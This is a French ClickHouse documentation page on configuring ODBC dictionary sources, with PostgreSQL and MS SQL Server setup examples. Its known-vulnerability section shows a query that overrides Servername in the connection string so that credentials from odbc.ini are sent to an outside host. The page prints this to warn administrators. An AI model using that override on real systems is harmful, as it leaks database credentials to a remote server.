---
slug: /sql-reference/statements/create/dictionary/sources/odbc
title: 'Source de dictionnaire ODBC'
sidebar_position: 6
sidebar_label: 'ODBC'
description: 'Configure une connexion ODBC en tant que source de dictionnaire dans ClickHouse.'
doc_type: 'référence'
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';

Vous pouvez utiliser cette méthode pour vous connecter à n’importe quelle base de données disposant d’un pilote ODBC.

Exemple de paramètres :

<Tabs>
  <TabItem value="ddl" label="DDL" default>
    ```sql
    SOURCE(ODBC(
        db 'DatabaseName'
        table 'SchemaName.TableName'
        connection_string 'DSN=some_parameters'
        invalidate_query 'SQL_QUERY'
        query 'SELECT id, value_1, value_2 FROM db_name.table_name'
    ))
    ```
  </TabItem>

  <TabItem value="xml" label="Fichier de configuration">
    ```xml
    <source>
        <odbc>
            <db>DatabaseName</db>
            <table>ShemaName.TableName</table>
            <connection_string>DSN=some_parameters</connection_string>
            <invalidate_query>SQL_QUERY</invalidate_query>
            <query>SELECT id, value_1, value_2 FROM ShemaName.TableName</query>
        </odbc>
    </source>
    ```
  </TabItem>
</Tabs>

<br />

Champs de paramétrage :

| Setting                | Description                                                                                                                                                                  |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `db`                   | Nom de la base de données. Omettez-le si le nom de la base de données est défini dans les paramètres de `<connection_string>`.                                               |
| `table`                | Nom de la table et du schéma, s’il existe.                                                                                                                                   |
| `connection_string`    | Chaîne de connexion.                                                                                                                                                         |
| `invalidate_query`     | Requête permettant de vérifier le statut du dictionnaire. Facultatif. Pour en savoir plus, consultez la section [Refreshing dictionary data using LIFETIME](../lifetime.md). |
| `background_reconnect` | Se reconnecte à la replica en arrière-plan si la connexion échoue. Facultatif.                                                                                               |
| `query`                | Requête personnalisée. Facultatif.                                                                                                                                           |

:::note
Les champs `table` et `query` ne peuvent pas être utilisés ensemble. De plus, l’un des champs `table` ou `query` doit obligatoirement être déclaré.
:::

ClickHouse reçoit les caractères de guillemet du pilote ODBC et met tous les paramètres entre guillemets dans les requêtes envoyées au driver. Il est donc nécessaire de définir le nom de la table en respectant la casse utilisée dans la base de données.

Si vous rencontrez des problèmes d’encodage lors de l’utilisation d’Oracle, consultez l’entrée [FAQ](/fr/knowledgebase/oracle-odbc) correspondante.

<div id="known-vulnerability-of-the-odbc-dictionary-functionality">
  ### Vulnérabilité connue de la fonctionnalité des dictionnaires ODBC
</div>

:::note
Lors de la connexion à la base de données via le pilote ODBC, le paramètre de connexion `Servername` peut être remplacé. Dans ce cas, les valeurs de `USERNAME` et `PASSWORD` définies dans `odbc.ini` sont envoyées au serveur distant et risquent d’être compromises.
:::

**Exemple d&#39;utilisation non sécurisée**

Configurons unixODBC pour PostgreSQL. Contenu de `/etc/odbc.ini` :

```text
[gregtest]
Driver = /usr/lib/psqlodbca.so
Servername = localhost
PORT = 5432
DATABASE = test_db
#OPTION = 3
USERNAME = test
PASSWORD = test
```

Si vous exécutez ensuite une requête comme

```sql
SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');
```

Le pilote ODBC transmettra les valeurs de `USERNAME` et `PASSWORD` de `odbc.ini` à `some-server.com`.

<div id="example-of-connecting-postgresql">
  ### Exemple de connexion à PostgreSQL
</div>

Sous Ubuntu.

Installation de unixODBC et du pilote ODBC pour PostgreSQL :

```bash
$ sudo apt-get install -y unixodbc odbcinst odbc-postgresql
```

Configuration de `/etc/odbc.ini` (ou `~/.odbc.ini` si vous êtes connecté avec l’utilisateur qui exécute ClickHouse) :

```text
    [DEFAULT]
    Driver = myconnection

    [myconnection]
    Description         = PostgreSQL connection to my_db
    Driver              = PostgreSQL Unicode
    Database            = my_db
    Servername          = 127.0.0.1
    UserName            = username
    Password            = password
    Port                = 5432
    Protocol            = 9.3
    ReadOnly            = No
    RowVersioning       = No
    ShowSystemTables    = No
    ConnSettings        =
```

Configuration du dictionnaire dans ClickHouse :

<Tabs>
  <TabItem value="ddl" label="DDL" default>
    ```sql
    CREATE DICTIONARY table_name (
        id UInt64,
        some_column UInt64 DEFAULT 0
    )
    PRIMARY KEY id
    SOURCE(ODBC(connection_string 'DSN=myconnection' table 'postgresql_table'))
    LAYOUT(HASHED())
    LIFETIME(MIN 300 MAX 360)
    ```
  </TabItem>

  <TabItem value="xml" label="Fichier de configuration">
    ```xml
    <clickhouse>
        <dictionary>
            <name>table_name</name>
            <source>
                <odbc>
                    <!-- Vous pouvez spécifier les paramètres suivants dans connection_string : -->
                    <!-- DSN=myconnection;UID=username;PWD=password;HOST=127.0.0.1;PORT=5432;DATABASE=my_db -->
                    <connection_string>DSN=myconnection</connection_string>
                    <table>postgresql_table</table>
                </odbc>
            </source>
            <lifetime>
                <min>300</min>
                <max>360</max>
            </lifetime>
            <layout>
                <hashed/>
            </layout>
            <structure>
                <id>
                    <name>id</name>
                </id>
                <attribute>
                    <name>some_column</name>
                    <type>UInt64</type>
                    <null_value>0</null_value>
                </attribute>
            </structure>
        </dictionary>
    </clickhouse>
    ```
  </TabItem>
</Tabs>

<br />

Vous devrez peut-être modifier `odbc.ini` pour indiquer le chemin complet vers la bibliothèque du pilote `DRIVER=/usr/local/lib/psqlodbcw.so`.

<div id="example-of-connecting-ms-sql-server">
  ### Exemple de connexion à MS SQL Server
</div>

Système d’exploitation : Ubuntu.

Installation du pilote ODBC pour la connexion à MS SQL :

```bash
$ sudo apt-get install tdsodbc freetds-bin sqsh
```

Configuration du pilote :

```bash
    $ cat /etc/freetds/freetds.conf
    ...

    [MSSQL]
    host = 192.168.56.101
    port = 1433
    tds version = 7.0
    client charset = UTF-8

    # test TDS connection
    $ sqsh -S MSSQL -D database -U user -P password


    $ cat /etc/odbcinst.ini

    [FreeTDS]
    Description     = FreeTDS
    Driver          = /usr/lib/x86_64-linux-gnu/odbc/libtdsodbc.so
    Setup           = /usr/lib/x86_64-linux-gnu/odbc/libtdsS.so
    FileUsage       = 1
    UsageCount      = 5

    $ cat /etc/odbc.ini
    # $ cat ~/.odbc.ini # if you signed in under a user that runs ClickHouse

    [MSSQL]
    Description     = FreeTDS
    Driver          = FreeTDS
    Servername      = MSSQL
    Database        = test
    UID             = test
    PWD             = test
    Port            = 1433


    # (optional) test ODBC connection (to use isql-tool install the [unixodbc](https://packages.debian.org/sid/unixodbc)-package)
    $ isql -v MSSQL "user" "password"
```

Remarques :

* pour déterminer la version la plus ancienne de TDS prise en charge par une version donnée de SQL Server, consultez la documentation du produit ou [MS-TDS Product Behavior](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/135d0ebe-5c4c-4a94-99bf-1811eccb9f4a)

Configuration du dictionnaire dans ClickHouse :

<Tabs>
  <TabItem value="ddl" label="DDL" default>
    ```sql
    CREATE DICTIONARY test (
        k UInt64,
        s String DEFAULT ''
    )
    PRIMARY KEY k
    SOURCE(ODBC(table 'dict' connection_string 'DSN=MSSQL;UID=test;PWD=test'))
    LAYOUT(FLAT())
    LIFETIME(MIN 300 MAX 360)
    ```
  </TabItem>

  <TabItem value="xml" label="Fichier de configuration">
    ```xml
    <clickhouse>
        <dictionary>
            <name>test</name>
            <source>
                <odbc>
                    <table>dict</table>
                    <connection_string>DSN=MSSQL;UID=test;PWD=test</connection_string>
                </odbc>
            </source>

            <lifetime>
                <min>300</min>
                <max>360</max>
            </lifetime>

            <layout>
                <flat />
            </layout>

            <structure>
                <id>
                    <name>k</name>
                </id>
                <attribute>
                    <name>s</name>
                    <type>String</type>
                    <null_value></null_value>
                </attribute>
            </structure>
        </dictionary>
    </clickhouse>
    ```
  </TabItem>
</Tabs>